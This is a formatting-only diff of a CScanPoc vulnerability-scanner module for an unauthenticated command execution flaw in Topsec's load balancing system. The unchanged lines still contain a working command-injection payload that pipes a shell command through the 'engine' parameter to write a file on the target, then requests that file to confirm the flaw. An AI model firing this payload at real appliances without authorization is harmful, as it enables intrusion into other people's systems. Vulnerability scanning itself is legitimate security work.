@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'TOPSEC_0024'  # 平台漏洞编号，留空
     name = '天融信 前台无需登录命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-06-02'  # 漏洞公布时间
     desc = '''
         天融信负载均衡系统 /acc/debug/bytecache_run_action.php 
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '天融信负载均衡系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '105012b2-5367-4105-83e2-a39e9b7eaef0'
@@ -32,17 +34,17 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref http://www.wooyun.org/bugs/wooyun-2015-0117621
+            # ref http://www.wooyun.org/bugs/wooyun-2015-0117621
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/acc/debug/bytecache_run_action.php?action=1&engine=%20|%20echo%20testvultest3%20>%20a.php%20|%20&ipfilter=10"
             target = arg + payload
-            code, head, res, errcode, _ = hh.http(target);
+            code, head, res, errcode, _ = hh.http(target)
             payload = '/acc/debug/a.php'
             target = arg + payload
             code, head, res, errcode, _ = hh.http(target)
             if 'testvultest' in res:
-                #security_hole(target)
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -51,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
